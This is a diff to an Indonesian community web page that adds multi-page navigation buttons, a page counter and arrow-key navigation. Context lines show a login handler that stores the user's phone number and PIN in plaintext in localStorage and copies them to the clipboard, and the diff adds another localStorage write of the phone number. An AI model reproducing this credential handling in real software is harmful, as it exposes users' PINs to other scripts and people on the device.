@@ -41,6 +41,59 @@ body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #1a
   font-style: italic;
 }
 
+/* NAVIGATION BUTTONS */
+.nav-buttons {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  gap: 10px;
+  position: fixed;
+  bottom: 20px;
+  left: 20px;
+  right: 20px;
+  z-index: 500;
+}
+
+.btn-nav {
+  background: linear-gradient(135deg, #C9A84C, #E8C97A);
+  color: #0a0a0a;
+  border: none;
+  border-radius: 10px;
+  padding: 12px 20px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: all 0.3s;
+  font-size: 13px;
+  letter-spacing: 0.05em;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.btn-nav:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(201, 168, 76, 0.4);
+}
+
+.btn-nav:active { transform: translateY(0); }
+
+.btn-nav:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+  transform: none;
+}
+
+.nav-counter {
+  background: rgba(255, 255, 255, 0.2);
+  border: 1px solid #C9A84C;
+  border-radius: 8px;
+  padding: 8px 12px;
+  font-size: 12px;
+  color: #C9A84C;
+  flex: 1;
+  text-align: center;
+}
+
 /* POPUP CONTAINER */
 .popup-overlay {
   position: fixed;
@@ -64,6 +117,7 @@ body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #1a
   border: 2px solid #C9A84C;
   box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5);
   animation: slideIn 0.4s ease-out;
+  margin-bottom: 100px;
 }
 @keyframes slideIn {
   from { transform: translateY(-50px); opacity: 0; }
@@ -233,7 +287,7 @@ body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #1a
 .container {
   max-width: 1200px;
   margin: 0 auto;
-  padding: 20px;
+  padding: 20px 20px 120px 20px;
 }
 
 .grid-content {
@@ -281,7 +335,7 @@ body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #1a
 /* AUTO-COPY NOTIFICATION */
 .copy-notification {
   position: fixed;
-  bottom: 20px;
+  bottom: 80px;
   right: 20px;
   background: #31a24c;
   color: #fff;
@@ -344,11 +398,24 @@ body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #1a
   line-height: 1.6;
 }
 
+/* PAGE INDICATOR */
+.page-info {
+  text-align: center;
+  padding: 20px;
+  color: rgba(201, 168, 76, 0.7);
+  font-size: 13px;
+  font-family: 'Cinzel', serif;
+  letter-spacing: 1px;
+}
+
 /* RESPONSIVE */
 @media (max-width: 768px) {
   .grid-content { grid-template-columns: 1fr; }
   .popup-box { padding: 20px; }
   .emblem-title { font-size: 22px; }
+  .nav-buttons { flex-direction: column-reverse; }
+  .btn-nav { width: 100%; }
+  .nav-counter { width: 100%; }
 }
 
 /* SCROLLBAR STYLE */
@@ -405,7 +472,7 @@ body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #1a
       <label class="search-label">🔍 CARI MEMBER AKTIF</label>
       <div class="search-input-group">
         <input class="search-input" type="text" id="memberSearch" placeholder="Nama atau username...">
-        <button class="btn-search" onclick="searchMembers()">CARI</button>
+        <button class="btn-search" type="button" onclick="searchMembers()">CARI</button>
       </div>
 
       <div class="member-list" id="memberList" style="display: none;">
@@ -422,6 +489,10 @@ body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #1a
 
 <!-- MAIN CONTENT (Hidden until login) -->
 <div class="container" id="mainContent" style="display: none;">
+
+  <div class="page-info">
+    📄 HALAMAN 1 dari 4 • SERVER EMBLEM & MEDIA SOSIAL
+  </div>
 
   <div class="grid-content">
 
@@ -555,7 +626,60 @@ body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #1a
   </div>
 </div>
 
+<!-- NAVIGATION BUTTONS -->
+<div class="nav-buttons" id="navButtons" style="display: none;">
+  <button class="btn-nav" id="btnBack" onclick="previousPage()" style="visibility: hidden;">
+    ← SEBELUMNYA
+  </button>
+  <div class="nav-counter">
+    <span id="pageCounter">1</span> / 4
+  </div>
+  <button class="btn-nav" id="btnNext" onclick="nextPage()">
+    BERIKUTNYA →
+  </button>
+</div>
+
 <script>
+// PAGE NAVIGATION SYSTEM
+const pages = [
+  { name: 'Server Emblem', file: 'index-emblem.html', desc: 'HALAMAN 1 dari 4 • SERVER EMBLEM & MEDIA SOSIAL' },
+  { name: 'Home Community', file: 'home.html', desc: 'HALAMAN 2 dari 4 • KOMUNITAS & INTERAKSI MEMBER' },
+  { name: 'Android UI', file: 'halaman.html', desc: 'HALAMAN 3 dari 4 • MOBILE INTERFACE' },
+  { name: 'Portal Nur AI', file: 'index.html', desc: 'HALAMAN 4 dari 4 • NUR AI COMMAND CENTER' }
+];
+
+let currentPage = 0;
+
+function updatePageInfo() {
+  const pageInfo = document.querySelector('.page-info');
+  if (pageInfo) {
+    pageInfo.textContent = pages[currentPage].desc;
+  }
+
+  const pageCounter = document.getElementById('pageCounter');
+  if (pageCounter) {
+    pageCounter.textContent = currentPage + 1;
+  }
+
+  const btnBack = document.getElementById('btnBack');
+  const btnNext = document.getElementById('btnNext');
+
+  btnBack.style.visibility = currentPage === 0 ? 'hidden' : 'visible';
+  btnNext.disabled = currentPage === pages.length - 1;
+}
+
+function nextPage() {
+  if (currentPage < pages.length - 1) {
+    window.location.href = pages[currentPage + 1].file;
+  }
+}
+
+function previousPage() {
+  if (currentPage > 0) {
+    window.location.href = pages[currentPage - 1].file;
+  }
+}
+
 // AUTO-DELETE TIMER COUNTDOWN
 function updateTimers() {
   const posts = [
@@ -638,6 +762,7 @@ function handleLogin(event) {
   // SAVE TO LOCALSTORAGE (Auto-copy when login)
   const loginData = `Phone: ${phone}\nPIN: ${pin}\nTime: ${new Date().toLocaleString('id-ID')}`;
   localStorage.setItem('lastLogin', loginData);
+  localStorage.setItem('userPhone', phone);
 
   // COPY TO CLIPBOARD
   navigator.clipboard.writeText(loginData).then(() => {
@@ -650,8 +775,9 @@ function handleLogin(event) {
   // HIDE POPUP & SHOW MAIN CONTENT
   document.getElementById('popupOverlay').style.display = 'none';
   document.getElementById('mainContent').style.display = 'block';
+  document.getElementById('navButtons').style.display = 'flex';
 
-  // UPDATE MEMBER COUNT
+  updatePageInfo();
   updateActiveMembers();
 }
 
@@ -703,6 +829,8 @@ function showNotification(message) {
 
 // AUTO-HIDE POPUP JIKA SUDAH LOGIN
 window.addEventListener('load', () => {
+  updatePageInfo();
+  
   const lastLogin = localStorage.getItem('lastLogin');
   if (lastLogin) {
     // User sudah login sebelumnya
@@ -710,6 +838,7 @@ window.addEventListener('load', () => {
     if (confirm_auto) {
       document.getElementById('popupOverlay').style.display = 'none';
       document.getElementById('mainContent').style.display = 'block';
+      document.getElementById('navButtons').style.display = 'flex';
       updateActiveMembers();
     }
   }
@@ -723,6 +852,12 @@ setInterval(() => {
   }
   updateActiveMembers();
 }, 30000);
+
+// KEYBOARD NAVIGATION
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'ArrowRight') nextPage();
+  if (e.key === 'ArrowLeft') previousPage();
+});
 </script>
 
 </body>
